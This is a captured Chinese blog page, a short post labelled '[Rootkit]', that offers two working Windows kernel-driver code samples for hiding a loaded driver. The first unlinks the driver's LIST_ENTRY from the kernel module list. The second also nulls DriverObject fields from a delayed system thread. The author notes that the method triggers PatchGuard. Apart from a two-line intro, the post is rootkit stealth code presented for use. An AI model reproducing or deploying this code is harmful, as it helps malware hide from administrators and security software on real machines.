@@ -1,0 +1,776 @@
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="zh-cn"><head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="referrer" content="origin-when-crossorigin" />
+    <meta name="description" content="注意 ： 此方法会触发 PG 代码参考 1 typedef struct _driverdata { LIST_ENTRY listentry; ULONG unknown1; ULONG unkno" />
+    <meta property="og:description" content="注意 ： 此方法会触发 PG 代码参考 1 typedef struct _driverdata { LIST_ENTRY listentry; ULONG unknown1; ULONG unkno" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>[Rootkit] 驱动隐藏 - 断链 - lyshark - 博客园</title>
+    <link id="favicon" rel="shortcut icon" href="//common.cnblogs.com/favicon.svg" type="image/svg+xml" />
+    
+    <style>:not(.cnblogs_code):not(.cnblogs_Highlighter)&gt;pre:not([class*="language-"]):not([highlighted]):not(.hljs) {
+        background: rgb(245, 247, 255);
+        padding: 14px;
+        border: 0px none rgb(94, 102, 135);
+        border-radius: 0px;
+        border-color: transparent;
+        color: rgb(94, 102, 135);
+        font-family: Consolas, Menlo, Monaco, "Andale Mono WT", "Andale Mono", "Lucida Console", "Lucida Sans Typewriter", "DejaVu Sans Mono", "Bitstream Vera Sans Mono", "Liberation Mono", "Nimbus Mono L", "Courier New", Courier, monospace;
+    }</style><link rel="stylesheet" href="/css/blog-common.min.css?v=Mu9uKkx5bOpY_U2n11z4SOX-euoho7tFrhfJR3pOw1Y" />
+    <link id="MainCss" rel="stylesheet" href="/skins/simpleblue/bundle-simpleblue.min.css?v=FSeEa-rFf0sIksBzbHaXW8Iv0NfilAepvltZw3cr-9k" />
+    <link id="highlighter-theme-prism-base16-ateliersulphurpool.light" type="text/css" rel="stylesheet" href="/css/prismjs/prism-base16-ateliersulphurpool.light.css?v=kHDZWvOQDdleGnGCsrU4mlvPUN0LuDa2i9C1cBh8jD4" />
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/LyShark/custom.css?v=afwUSFtghd9uL39cscvfzVAs7tk=" />
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/skins/simpleblue/bundle-simpleblue-mobile.min.css?v=rj2vgM9-SnOpGgktnrBKAhiwG7zaFNNydpmw5HBgjcQ" />
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/LyShark/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/LyShark/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/LyShark/wlwmanifest.xml" />
+    <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script>
+        var currentBlogId = 429047;
+        var currentBlogApp = 'LyShark';
+        var cb_enable_mathjax = false;
+        var isLogined = false;
+        var isBlogOwner = false;
+        var skinName = 'SimpleBlue';
+        var visitorUserId = '';
+        var hasCustomScript = true;
+        try {
+            if (hasCustomScript &amp;&amp; document.referrer &amp;&amp; document.referrer.indexOf('baidu.com') &gt;= 0) {
+                Object.defineProperty(document, 'referrer', { value: '' });
+                Object.defineProperty(Document.prototype, 'referrer', { get: function(){ return ''; } });
+            }
+        } catch(error) { }
+        window.codeHighlightEngine = 2;
+        window.enableCodeLineNumber = false;
+        window.codeHighlightTheme = 'prism-base16-ateliersulphurpool.light';
+    </script>
+        <script>
+            var currentPostDateAdded = '2021-07-16 10:17';
+        </script>
+    <script src="https://common.cnblogs.com/scripts/jquery-2.2.0.min.js"></script>
+    <script src="/js/blog-common.min.js?v=887Sb7P1motSoOBzgjBusvqQpRLyN2zl1Q2JIOou-CY"></script><style type="text/css">.medium-zoom-overlay{position:fixed;top:0;right:0;bottom:0;left:0;opacity:0;transition:opacity .3s;will-change:opacity}.medium-zoom--opened .medium-zoom-overlay{cursor:pointer;cursor:zoom-out;opacity:1}.medium-zoom-image{cursor:pointer;cursor:zoom-in;transition:transform .3s cubic-bezier(.2,0,.2,1)!important}.medium-zoom-image--hidden{visibility:hidden}.medium-zoom-image--opened{position:relative;cursor:pointer;cursor:zoom-out;will-change:transform}</style><script id="prismjs-script" async="" data-loaded="true" src="https://common.cnblogs.com/prism/prism.js?v=1.23.0"></script>
+    
+    
+    
+<script id="prismjs-autoloader-script" async="" data-loaded="true" src="https://common.cnblogs.com/prism/plugins/autoloader/prism-autoloader.min.js"></script></head>
+<body class="skin-simpleblue no-navbar prismjs-engine">
+    <a name="top"></a>
+    <div id="top_nav" class="navbar forpc navbar-custom">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding"><a href="https://www.cnblogs.com/" title="开发者的网上家园"><img src="/images/logo.svg?v=R9M0WmLAIPVydmdzE2keuvnjl-bPR7_35oHqtiBzGsM" alt="博客园Logo" /></a></li>
+                <li><a href="/" onclick="countClicks('skin-navbar-sitehome')">首页</a></li>
+                <li><a href="https://news.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-news')">新闻</a></li>
+                <li><a href="https://q.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-q')">博问</a></li>
+                <li><a id="nav_brandzone" href="https://brands.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-brands')">专区</a></li>
+                <li><a href="https://ing.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-ing')">闪存</a></li>
+                <li><a href="https://edu.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-edu')">班级</a></li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search" action="https://zzk.cnblogs.com/s" method="get">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="text" tabindex="3" />
+                        <button type="submit" id="zzk_search_button">
+                            <img src="/images/aggsite/search.svg" alt="搜索" />
+                        </button>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔" style="display: none;">
+                        <img id="new_post_icon" class="navbar-icon" src="/images/aggsite/newpost.svg" alt="写随笔" />
+                    </a>
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx" alt="我的博客" title="我的博客" style="display: none;">
+                        <img id="myblog_icon" class="navbar-icon" src="/images/aggsite/myblog.svg" alt="我的博客" />
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息" style="display: none;">
+                        <img id="msg_icon" class="navbar-icon" src="/images/aggsite/message.svg?v=J0WS2P2iPgaIVgXxcAhliw4AFZIpaTWxtdoNAv9eiCA" alt="短消息" />
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown" style="display: none;">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="/images/aggsite/avatar-default.svg" alt="用户头像" />
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
+    简洁模式 <img id="navbar_lite_mode_on" src="/images/lite-mode-check.svg" class="hide" /><span id="navbar_lite_mode_spinner" class="hide">...</span>
+</a>
+                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup/" style="display: inline;">注册</a>
+                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()" style="display: inline;">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    
+    <div id="home">
+    <div id="header">
+        <div id="blogTitle">
+            <div class="title"><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/LyShark/">LyShark</a>
+</div>
+<div class="subtitle">专注于C/C++安全开发，Windows 底层技术研究</div>
+
+        </div>
+        <div id="navigator">
+            
+<ul id="navList">
+    <li id="nav_sitehome"><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+    <li id="nav_myhome">
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/LyShark/">
+首页</a>
+</li>
+    <li id="nav_newpost">
+
+
+</li>
+    <li id="nav_contact">
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/lyshark">
+联系</a></li>
+    <li id="nav_rss">
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/LyShark/rss/">
+订阅</a></li>
+    <li id="nav_admin">
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+            <div class="blogStats">
+                
+<span id="stats_post_count">随笔 - 596 </span>
+<span id="stats_article_count">文章 - 0 </span>
+<span id="stats_comment_count">评论 - 9 </span>
+<span id="stats_total_view_count">阅读 - 
+<span title="总阅读数: 1026209">
+102万</span></span>
+            </div>
+        </div>
+    </div>
+    <div id="main">
+        <div id="mainContent">
+            <div class="forFlow">
+                <div id="post_detail">
+    <div id="topics">
+        <div class="post">
+            <h1 class="postTitle">
+                
+<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/LyShark/p/15018889.html">
+    <span>[Rootkit] 驱动隐藏 - 断链</span>
+    
+
+
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<p>注意 ： 此方法会触发 PG</p>
+<p>代码参考 1</p>
+<pre class=" language-none" highlighted="true"><code class=" language-none">typedef struct _driverdata
+{
+	LIST_ENTRY listentry;
+	ULONG unknown1;
+	ULONG unknown2;
+	ULONG unknown3;
+	ULONG unknown4;
+	ULONG unknown5;
+	ULONG unknown6;
+	ULONG unknown7;
+	UNICODE_STRING path;
+	UNICODE_STRING name;
+}driverdata;
+
+
+
+VOID xiezai1(PDRIVER_OBJECT qudongduixiang)
+{
+   
+	KdPrint(("驱动卸载\n"));
+}
+ 
+NTSTATUS DriverEntry(PDRIVER_OBJECT qudongduixiang, PUNICODE_STRING zhucebiao)
+{
+	KdPrint(("驱动入口开始\n"));
+	driverdata*driverdata1 = NULL;
+	driverdata1 = *(driverdata**)((ULONG)qudongduixiang + 20);
+	if (driverdata1!=NULL)
+	{
+		*(ULONG*)driverdata1-&gt;listentry.Blink = (ULONG)driverdata1-&gt;listentry.Flink;
+		driverdata1-&gt;listentry.Flink-&gt;Blink = driverdata1-&gt;listentry.Blink;
+	}
+	qudongduixiang-&gt;DriverUnload = xiezai1;
+	return STATUS_SUCCESS;
+}
+</code></pre>
+<p>代码参考 2</p>
+<pre class=" language-c" highlighted="true"><code class=" language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"ntddk.h"</span></span>
+HANDLE hThread<span class="token punctuation">;</span>
+VOID <span class="token function">DriverUnload</span><span class="token punctuation">(</span>PDRIVER_OBJECT pDriverObject<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+	<span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"驱动卸载成功\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+VOID <span class="token function">ThreadRun</span><span class="token punctuation">(</span>
+	 PVOID StartContext<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+	LARGE_INTEGER times<span class="token punctuation">;</span>
+	PDRIVER_OBJECT pDriverObject<span class="token punctuation">;</span>
+	times<span class="token punctuation">.</span>QuadPart <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">30</span> <span class="token operator">*</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span>  <span class="token comment">//等待3秒  单位是纳秒</span>
+	
+	<span class="token function">KeDelayExecutionThread</span><span class="token punctuation">(</span>KernelMode<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>times<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	pDriverObject<span class="token operator">=</span><span class="token punctuation">(</span>PDRIVER_OBJECT<span class="token punctuation">)</span>StartContext<span class="token punctuation">;</span>
+	<span class="token comment">//修改模块信息</span>
+	pDriverObject<span class="token operator">-&gt;</span>DriverSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	pDriverObject<span class="token operator">-&gt;</span>DriverSection <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	pDriverObject<span class="token operator">-&gt;</span>DriverExtension <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	pDriverObject<span class="token operator">-&gt;</span>DriverStart <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	pDriverObject<span class="token operator">-&gt;</span>DriverInit <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	pDriverObject<span class="token operator">-&gt;</span>FastIoDispatch <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	pDriverObject<span class="token operator">-&gt;</span>DriverStartIo <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	
+	<span class="token function">ZwClose</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+
+NTSTATUS	<span class="token function">DriverEntry</span><span class="token punctuation">(</span>PDRIVER_OBJECT pDriverObject<span class="token punctuation">,</span> PUNICODE_STRING pReg<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+	PLIST_ENTRY pModuleList<span class="token punctuation">;</span>
+	pModuleList <span class="token operator">=</span> pDriverObject<span class="token operator">-&gt;</span>DriverSection<span class="token punctuation">;</span>
+	
+	<span class="token comment">//前一个模块的Flink=本模块的Flink</span>
+	pModuleList<span class="token operator">-&gt;</span>Blink<span class="token operator">-&gt;</span>Flink <span class="token operator">=</span> pModuleList<span class="token operator">-&gt;</span>Flink<span class="token punctuation">;</span>
+	<span class="token comment">//前一个模块的Blink=本模块的Blink</span>
+	pModuleList<span class="token operator">-&gt;</span>Flink<span class="token operator">-&gt;</span>Blink <span class="token operator">=</span> pModuleList<span class="token operator">-&gt;</span>Blink<span class="token punctuation">;</span>
+	<span class="token function">PsCreateSystemThread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hThread<span class="token punctuation">,</span>GENERIC_ALL<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span> ThreadRun<span class="token punctuation">,</span> pDriverObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+
+</div>
+<div id="MySignature">
+    <b>文章出处：</b><a href="https://www.cnblogs.com/LyShark/p/15018889.html" target="_blank">https://www.cnblogs.com/LyShark/p/15018889.html</a> <br />
+<b>版权声明：</b>本博客文章与代码均为学习时整理的笔记，博客中除去明确标注有参考文献的文章，其他文章<b style="color: blue;"> [均为原创] </b>作品，转载请<b style="color: green;"> [添加出处] </b>，您添加出处是我创作的动力！<br />
+<br /><b style="color:red;">如果您恶意转载本人文章并被本人发现，则您的整站文章，将会变为我的原创作品，请相互尊重 ！</b>
+
+
+</div>
+<div class="clear"></div>
+<div id="blog_post_info_block"><div id="BlogPostCategory">
+    分类: 
+            <a href="https://www.cnblogs.com/LyShark/category/1221553.html" target="_blank">C/C++ 编程代码笔记</a></div>
+<div id="EntryTag">
+    标签: 
+            <a href="https://www.cnblogs.com/LyShark/tag/C%2FC%2B%2B%20%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/">C/C++ 黑客编程</a></div>
+
+    <div id="blog_post_info">
+<div id="green_channel">
+        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(15018889,cb_blogId,1);green_channel_success(this,'谢谢推荐！');">好文要顶</a>
+        <a id="green_channel_follow" onclick="follow('8a55a89b-7bd3-481e-d52e-08d5866282ce');" href="javascript:void(0);">关注我</a>
+    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a>
+    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="https://common.cnblogs.com/images/icon_weibo_24.png" alt="" /></a>
+    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="https://common.cnblogs.com/images/wechat.png" alt="" /></a>
+</div>
+<div id="author_profile">
+    <div id="author_profile_info" class="author_profile_info">
+            <a href="https://home.cnblogs.com/u/LyShark/" target="_blank"><img src="https://pic.cnblogs.com/face/1379525/20211108135747.png" class="author_avatar" alt="" /></a>
+        <div id="author_profile_detail" class="author_profile_info">
+            <a href="https://home.cnblogs.com/u/LyShark/">lyshark</a><br />
+            <a href="https://home.cnblogs.com/u/LyShark/followees/">关注 - 2</a><br />
+            <a href="https://home.cnblogs.com/u/LyShark/followers/">粉丝 - 591</a>
+        </div>
+    </div>
+    <div class="clear"></div>
+    <div id="author_profile_honor"></div>
+    <div id="author_profile_follow">
+                <a href="javascript:void(0);" onclick="follow('8a55a89b-7bd3-481e-d52e-08d5866282ce');return false;">+加关注</a>
+    </div>
+</div>
+<div id="div_digg">
+    <div class="diggit" onclick="votePost(15018889,'Digg')">
+        <span class="diggnum" id="digg_count">0</span>
+    </div>
+    <div class="buryit" onclick="votePost(15018889,'Bury')">
+        <span class="burynum" id="bury_count">0</span>
+    </div>
+    <div class="clear"></div>
+    <div class="diggword" id="digg_tips">
+    </div>
+</div>
+
+<script type="text/javascript">
+    currentDiggType = 0;
+</script></div>
+    <div class="clear"></div>
+    <div id="post_next_prev">
+
+    <a href="https://www.cnblogs.com/LyShark/p/15018881.html" class="p_n_p_prefix">« </a> 上一篇：    <a href="https://www.cnblogs.com/LyShark/p/15018881.html" title="发布于 2021-07-16 10:15">强制让目标进程执行自己的 ShellCode</a>
+    <br />
+    <a href="https://www.cnblogs.com/LyShark/p/15018909.html" class="p_n_p_prefix">» </a> 下一篇：    <a href="https://www.cnblogs.com/LyShark/p/15018909.html" title="发布于 2021-07-16 10:21">[Rootkit] 进程隐藏 - 内存加载（寄生&amp;僵尸进程）</a>
+
+</div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date">2021-07-16 10:17</span> 
+<a href="https://www.cnblogs.com/LyShark/">lyshark</a> 
+阅读(<span id="post_view_count">65</span>) 
+评论(<span id="post_comment_count">0</span>) 
+<a href="https://i.cnblogs.com/EditPosts.aspx?postid=15018889" rel="nofollow">编辑</a> 
+<a href="javascript:void(0)" onclick="AddToWz(15018889);return false;">收藏</a> 
+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '15018889', targetLink: 'https://www.cnblogs.com/LyShark/p/15018889.html', title: '[Rootkit] 驱动隐藏 - 断链' })">举报</a></div>
+        </div>
+        
+<script>
+    markdown_highlight()
+    var allowComments = true, cb_blogId = 429047, cb_blogApp = 'LyShark', cb_blogUserGuid = '8a55a89b-7bd3-481e-d52e-08d5866282ce';
+    var cb_entryId = 15018889, cb_entryCreatedDate = '2021-07-16 10:17', cb_postType = 1;
+    updatePostStats(
+        [cb_entryId],
+        function(id, count) { $("#post_view_count").text(count) },
+        function(id, count) { $("#post_comment_count").text(count) })
+    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");
+</script>
+        <a name="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+    <div id="comment_form_container" style="visibility: visible;"><div class="login_tips">
+    登录后才能查看或发表评论，立即 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return account.login('!comments');">登录</a> 或者
+    <a href="https://www.cnblogs.com/">逛逛</a> 博客园首页
+</div>
+</div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+    <div id="cnblogs_ch"><a href="https://brands.cnblogs.com/huawei" target="_blank" onclick="gtag('event', 'click', {'event_category': 'ad', 'event_label': 'T2-华为专区'})">【推荐】华为开发者专区，与开发者一起构建万物互联的智能世界</a><br /><a href="http://www.uccpsoft.com/index.htm" target="_blank" onclick="gtag('event', 'click', {'event_category': 'ad', 'event_label': 'T2-ucancode'})">【推荐】跨平台组态\工控\仿真\CAD 50万行C++源码全开放免费下载！</a><br /><a href="https://brands.cnblogs.com/huawei/p/2749" target="_blank" onclick="gtag('event', 'click', {'event_category': 'ad', 'event_label': 'T2-华为专区'})">【推荐】华为 HMS Core Insights 直播预告：手语服务，助力沟通无障碍</a><br /></div>
+    <div id="opt_under_post"></div>
+    <div id="cnblogs_c1" class="under-post-card">
+            <a href="https://campaign.tencent.com/audiovideo/?c=1ykYj45F" rel="nofollow" target="_blank" onclick="logCreativeClick(504);countCreativeClicks('C1-腾讯云')">
+                <img src="https://img2020.cnblogs.com/blog/35695/202112/35695-20211222111937217-1095539880.jpg" onload="logCreativeImpression(504);countCreativeImpressions('C1-腾讯云')" alt="" />
+            </a>
+    </div>
+    <div id="under_post_card1"></div>
+    <div id="under_post_card2"></div>
+    <div id="HistoryToday" class="under-post-card">
+<b>历史上的今天：</b>
+<br />
+
+2019-07-16    <a href="https://www.cnblogs.com/LyShark/p/11197005.html">X86逆向15：OD脚本的编写技巧</a>
+    <br />
+</div>
+    <script type="text/javascript">
+       var commentManager = new blogCommentManager();
+       commentManager.renderComments(0);
+       fixPostBody();
+
+           window.tocManager.displayDisableTocTips = false
+           window.tocManager.generateToc();
+           setTimeout(function() { incrementViewCount(cb_entryId); }, 50);       deliverT2();
+       deliverC1C2();
+       loadNewsAndKb();
+LoadPostCategoriesTags(cb_blogId, cb_entryId);       LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+       GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+       loadOptUnderPost();
+       GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+    </script>
+</div>
+
+    </div>
+</div>
+            </div>
+        </div>
+
+        <div id="sideBar">
+            <div id="sideBarMain">
+                <div id="sidebar_news" class="newsItem">
+<h3 class="catListTitle">公告</h3>
+
+<div id="blog-news">
+    <center>
+    个人博客: <span style="color: #399ab2;"><a href="https://www.lyshark.com">www.lyshark.com</a></span><br />
+<hr style="height:1px;border:none;border-top:1px solid #555555;" />
+    <span id="busuanzi_container_site_pv" style="display: inline;">访问量: <span style="color: #399ab2;" id="busuanzi_value_site_pv">4131507</span></span> | 
+    <span id="busuanzi_container_site_uv" style="display: inline;">访客数: <span style="color: #399ab2;" id="busuanzi_value_site_uv">3296479</span></span><br />
+<hr style="height:1px;border:none;border-top:1px solid #555555;" />
+</center>
+
+<script type="text/javascript">window['__document_write_ajax_callbacks__']['3']();</script><script type="text/javascript">window['__document_write_ajax_callbacks__']['4']();</script><script language="javascript" type="text/javascript" async="">window['__document_write_ajax_callbacks__']['1']();</script>
+    <div id="profile_block">
+        昵称：
+        <a href="https://home.cnblogs.com/u/LyShark/">
+            lyshark
+        </a>
+        <br />
+        园龄：
+        <a href="https://home.cnblogs.com/u/LyShark/" title="入园时间：2018-04-18">
+            3年8个月
+        </a>
+        <br />
+        粉丝：
+        <a href="https://home.cnblogs.com/u/LyShark/followers/">
+            591
+        </a>
+        <br />
+        关注：
+        <a href="https://home.cnblogs.com/u/LyShark/followees/">
+            2
+        </a>
+        <div id="p_b_follow">
+<a href="javascript:void(0)" onclick="follow('8a55a89b-7bd3-481e-d52e-08d5866282ce')">+加关注</a></div>
+        <script type="text/javascript">window['__document_write_ajax_callbacks__']['5']();</script><script>window['__document_write_ajax_callbacks__']['2']();</script>
+    </div>
+</div></div>
+<div id="sidebar_c3"></div>
+                <div id="calendar"><div id="blog-calendar" style="display:none"></div></div>                
+                <script>loadBlogDefaultCalendar();</script>
+                <div id="leftcontentcontainer">
+                    <!-- begin:SingleColumn -->
+                    <div id="blog-sidecolumn"><!-- 搜索 -->
+<div id="sidebar_search" class="sidebar-block">
+    <div id="sidebar_search" class="mySearch">
+        <h3 class="catListTitle">搜索</h3>
+        <div id="sidebar_search_box">
+            <div id="widget_my_zzk" class="div_my_zzk">
+                <input type="text" id="q" onkeydown="return zzk_go_enter(event);" class="input_my_zzk" /> <input onclick="zzk_go()" type="button" value="找找看" id="btnZzk" class="btn_my_zzk" />
+            </div>
+            
+        </div>
+    </div>
+</div>
+
+<!-- 常用链接 -->
+
+
+<!-- 最新随笔 -->
+
+
+<!-- 我的标签 -->
+<div id="sidebar_toptags" class="sidebar-block">
+<div class="catListTag">
+    <h3 class="catListTitle">我的标签</h3>
+    <ul>
+                <li>
+            <a href="https://www.cnblogs.com/LyShark/tag/C%2FC%2B%2B%20%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/">C/C++ 黑客编程<span class="tag-count">(96)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/LyShark/tag/%E6%B8%97%E9%80%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">渗透与网络安全<span class="tag-count">(48)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/LyShark/tag/Python%20%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/">Python 黑客编程<span class="tag-count">(28)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/LyShark/tag/%E6%B8%B8%E6%88%8F%E5%A4%96%E6%8C%82%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/">游戏外挂开发技术<span class="tag-count">(27)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/LyShark/tag/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3%E6%8A%80%E6%9C%AF/">软件逆向破解技术<span class="tag-count">(26)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/LyShark/tag/%E6%B1%87%E7%BC%96%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/">汇编与反汇编技术<span class="tag-count">(20)</span></a>
+        </li>
+        <li>
+            <a href="https://www.cnblogs.com/LyShark/tag/Windows%20%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B/">Windows 内核编程<span class="tag-count">(11)</span></a>
+        </li>
+    
+
+    </ul>
+</div>
+</div>
+
+<!-- 积分与排名 -->
+<div id="sidebar_scorerank" class="sidebar-block">
+<div class="catListBlogRank">
+    <h3 class="catListTitle">积分与排名</h3>
+    <ul>
+        <li class="liScore">
+            积分 - 
+512683
+        </li>
+        <li class="liRank">
+            排名 - 
+951
+        </li>
+    </ul>
+</div></div>
+
+<!-- 随笔分类、随笔档案、文章分类、新闻分类、相册、链接 -->
+<div id="sidebar_categories">
+
+    <div class="catListPostCategory">
+        <h3 class="catListTitle">
+            
+随笔分类
+
+
+
+        </h3>
+        <ul>
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2038070.html" class="category-item-link" rel="" target="">Ansible 自动化使用笔记(7)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2038133.html" class="category-item-link" rel="" target="">C/C++ Boost 开发笔记(8)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2038135.html" class="category-item-link" rel="" target="">C/C++ Qt 窗体开发笔记(37)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1221553.html" class="category-item-link" rel="" target="">C/C++ 编程代码笔记(125)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2038134.html" class="category-item-link" rel="" target="">C/C++ 基础知识点总结(16)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2038036.html" class="category-item-link" rel="" target="">Django Web 框架笔记(20)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2038069.html" class="category-item-link" rel="" target="">Docker 容器使用笔记(7)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2038132.html" class="category-item-link" rel="" target="">Flask Web 框架笔记(8)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
